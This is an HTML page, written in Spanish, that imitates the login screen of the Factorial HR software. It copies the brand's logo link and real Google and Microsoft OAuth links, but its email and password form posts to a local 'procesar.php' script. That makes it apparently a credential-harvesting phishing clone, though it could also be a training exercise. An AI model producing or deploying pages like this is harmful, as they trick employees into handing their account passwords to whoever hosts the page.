<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Entra en Factorial, Software de RRHH</title>

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap');

        body {
            font-family: Arial, Helvetica, sans-serif;
            font-size: 20px;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            height: 100vh;
            background-color: white;
            margin: 0;
            position: relative;
        }

        h3 {
            font-size: 1.5rem;
        }

        .login-container {
            font-family: Arial, Helvetica, sans-serif;
            background: white;
            padding: 9rem;
            border-radius: 10px;
            text-align: center;
            max-width: 2000px;
            margin-top: 5vh;
            position: relative;
        }

        #sesion {
            font-family: "Montserrat", serif;
            font-weight: 500;
        }

        .header-block__line {
            display: flex;
            align-items: center;
            justify-content: center;
            background-color: #ff355e;
            margin-right: 45%;
            margin-left: 45%;
            height: 0.15rem;
        }

        #continuar {
            font-size: 14px;
        }

        .logo {
            position: absolute;
            top: 1px;
            left: 1px;
            width: 200px;
            height: auto;
        }

        .social-login {
            display: flex;
            justify-content: space-between;
            margin: 15px;
            gap: 10px;
        }

        .social-btn {
            width: 48%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 20px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 16px;

        }

        .social-btn img {
            width: 20px;
            margin-right: 8px;
        }

        .separator {
            margin: 15px 0;
            border-bottom: 1px solid #ddd;
            position: relative;
        }

        .separator span {
            position: absolute;
            top: -10px;
            left: 50%;
            transform: translateX(-50%);
            background: white;
            padding: 0 10px;
            color: #666;
        }

        input {
           
        }

        .input-container {
            position: relative;
            margin-bottom: 25px;
        }

        input { width: 100%;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 14px;
            width: 100%;
            padding: 33px 10px 14px 10px;
            height: 20px;
            border: 2px solid gray;
            border-radius: 5px;
            font-size: 15px;
            outline: none;
            transition: border-color 0.3s;
        }

        input:focus {
            border-color: teal;
        }

        label {
            position: absolute;
            top: 20px;
            left: 10px;
            font-size: 14px;
            color: gray;
            background: white;
            padding: 0 5px;
            transition: 0.3s ease-in-out;
        }

        input:focus+label,
        input:not(:placeholder-shown)+label {
            top: 5px;
            font-size: 12px;  
        }

        .forgot-password {
            text-align: right;
            font-size: 12px;
            margin-bottom: 15px;
        }

        .forgot-password a {
            color: black;
            text-decoration: none;
        }

        .login-btn {
            width: 400px;
            padding: 20px;
            background: #ff3366;
            color: white;
            border: none;
            border-radius: 20px;
            cursor: pointer;
            font-size: 16px;
        }

        .login-btn:hover {
            width: 400px;
            padding: 20px;
            background: #e51943;
            color: white;
            border: none;
            border-radius: 20px;
            cursor: pointer;
            font-size: 16px;
        }

        .register-link {
            position: absolute;
            top: 20px;
            right: 20px;
            font-size: 15px;
        }

        .register-link a {
            color: #2e838c;
            font-size: 15px;
        }

        .social-btn a {
            color: black;
            text-decoration: none;
            margin-bottom: 3px;
        }
    </style>
</head>

<body>
    <div class="login-container">
        <a href="https://factorialhr.com/">
            <img src="logo_factorial2.png" alt="Logo" class="logo">
        </a>
        <h3 id="sesion">Inicia sesión en tu cuenta de <br /> Factorial</h3>
        <div class="header-block__line"></div>
        <p id="continuar"> Continuar con...</p>
        <div class="social-login">
            <div class="social-btn">
                <a
                    href="https://accounts.google.com/o/oauth2/v2/auth/oauthchooseaccount?client_id=185825831634-41bc3lcg8c3blnsp0var2sbl6ucnhs96.apps.googleusercontent.com&redirect_uri=https%3A%2F%2Ffactorial-production.auth.eu-central-1.amazoncognito.com%2Foauth2%2Fidpresponse&scope=email%20profile%20openid&response_type=code&state=H4sIAAAAAAAAAG1SXXOaQBT9LzxnEQQRnOlDohaw1qiYGFI7zn7hrrC7BBADnf73rp22k4c-7d6559x77pzzw4DGxKAXgKlsKlgA-5j6fC46OC-NOwPpZqjUqaC6wLoYObA9V8zNAlRRzwsaxBBVlnOSGkA0gDVNWU8GA1hyM4O4URWHBatMrMQAq5PkjRooeGmYxlONx4rcZmcfF52MyTeDCsgLXaiSSk70p6xUxn_34bU2_8wya65faV5qWpmQCC6N73cGu93ULRRyVlZ8Vjx9eSiX4pWlzrbFomAoZN1SrFqUxHUsFwWJnjtUBBbqYi8WzDocJIke-kfut5p6_T81YCTaFkhsGRKrYulsS7R_aki0YJqeDpsSCdyifXAhIatp4ndfZ7G97Oft1_PmcBigMDin-_divX_uY2l90iR9Wq6V73f1NPTAsH93os_3MVkztW-PQT3bgWGTRSgjL_nUYxtCmyI_npOcj3nSoGo-mx5zHJazcTWmYAqqdWRZ2L7fDN_oE9uF_LFS1m569JeyCUR2Kotk9WXNxKuYx2dvm_BTztXb45XCPrVmYiPze7BZvIGtPbqqSxCgHoKd28kWXp3A9cMkjbXiQiv-ZzTQJpELbriS5s1k82OyTChgr-Rf53QiNF0YE3vs-J43GnmuNtmYZLCo6Z1R3dJmBYHtjhGAtoWAa2c-CIYYA893Hd9HmDgwM37-AmjWZUvEAgAA.H4sIAAAAAAAAABNi-Zh6lql6_xNN9jRuti0r_6RUF3u9-8LV98X2pppYIhcARS0SCSAAAAA.3&access_type=offline&service=lso&o2v=2&ddm=1&flowName=GeneralOAuthFlow">
                    <img id="Google"
                        src="https://rotulosmatesanz.com/wp-content/uploads/2017/09/2000px-Google_G_Logo.svg_.png"
                        alt="Google">

                </a>
            </div>
            <div id="Microsoft" class="social-btn">
                <a
                    href="https://login.microsoftonline.com/common/reprocess?ctx=rQQIARAApZQ5jBt1GMVtnCwhCrCiQkJCW6QCZj33sRCJOewZezy2x-fYjTX_OTz3_Of0USKEqBBI0NCBlCaiACpIAw1NqiCEBFRpEFKKiDIlG6IU1Lzip695r_ree6OFn6MXNx3bJF2WRBHHsgiENB2AsI5DIo6N0yZqAZR12fyV66dv__nRg0-vfaZ9crz9zve_TKg7zQuvLGFx0W6b0D93TatMc9-MvPzcSuO2lW4Tv0zbsW_laZG6Zdu34SZ3CpgmhfNds3m_2fzjuZdHfFV6-BNcmo_O5607JwpZ9PhnkrGpYYx8TZhxg-POoDpFZ72B-sDEUTMqywnIK3usdsXpqtMz1V2x4TiSPVbHgCnmLDU85tERFAy30oUA9MWZP_ehWQhD6lAMltMd3em6cqArGEmq3jJYHRYMlCuPolMRy-jKmuSdUJ_wcDpVZyUzL4e7PuQjMzPZJc-rMYh4MVprrADBtAOFMKimNAj1njpLIRwPBa4_k2ba0Nj3mcwymZTYD0mttxtsq3VnoXrBMjVheHSzpWjhY46JdWzWRyJ7CXtA7xRLOWLro5La5mXuvF-bU6e7Hkb4vCC6fRZnF6uiAzfixE5GezDq0OZ6cPCd8RqmGlvEsiH04i0XUwZZxqGLd72MNpINWgR-bOVSsVT1XAktnFvs3IlE2uEMcwfaYjKfZ70FtDV1XIpKXnRrq8_SbMCVXRYAIDlCsJBn0ANIHB9JyCyKEs00uxwPUVnSS4uyXZG1hQGHhtRkfBgWCpMuWWeS7mdbuAUA48pJuj6E-H5e9hdUFdKJTHCUUbugW1cKV49H-XSQVCDSdpuBV6-COoGOgoy93RSAPFxkPSX09EKxscFoxU51GVHoiNoM5nCNjVHLUikSo3Qidp21Aas1TtVMXDOmurGYCrMP_DBTRiG3RSIJQgE_DoygPspg5E9YPc37aA5lMMaZpbfS074bJcgMHcc-pWlgdOAraSUEq2TLrOWRww-RmZwphrvruHw5H6bCVqJgxQVmxxQ2KciTlSWBnSfuNwElMuQ-lPIuv-X58_88-KgkE4PwHFHaqH5oMzlK1wHBiVRaK33bQtQ8WW682kMEkB9SYQpwYn_413lO3GndRJ-KQJ7wKaxn1zN92zq5bGScJndbNzGAUaxJkMhl5TmEJB0KAThmI6xrESxuWw6Nufdarzux6UdnME9dP3LOUugkvn02L5z8fOKY9m-t5v0rzYdXbqCti2vXrp82Xm2cNR5faX559XInfv1AvXH79_LdH17bhl9902rcu9puZ0cD9LItKxLZ3Aihz-wyfwUN6U0C6646ugNEmuAG84i1btEX2Mcnzb9Pmh8-37j7wv-YmB9fbDx-6a_3Hv30_hc_P1IevvyW5tA0quKCIuW2tmCrgeIfClJaqzwmESrO49x4tTbNhRyit74-bTw4bfwD0&sessionid=1b158a34-f849-44e5-b21d-8fc382dce61f">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft">

                </a>
            </div>
        </div>
        <div class="separator"><span>o</span></div>
        <form action="procesar.php" method="post">
            <div class="input-container">
                <label for="email">Correo electrónico</label>
                <input type="email" id="email" name="email" required>
            </div>

            <div class="input-container">
                <label for="password">Contraseña</label>
                <input type="password" id="password" name="password" required>
            </div>
            <div class="forgot-password"><a href="#">¿Has olvidado tu contraseña?</a></div>
            <button type="submit" class="login-btn">Iniciar sesión</button>

        </form>
        <div class="register-link">
            ¿No tienes cuenta? <a href="#">Regístrate gratis</a>
        </div>
    </div>
</body>

</html>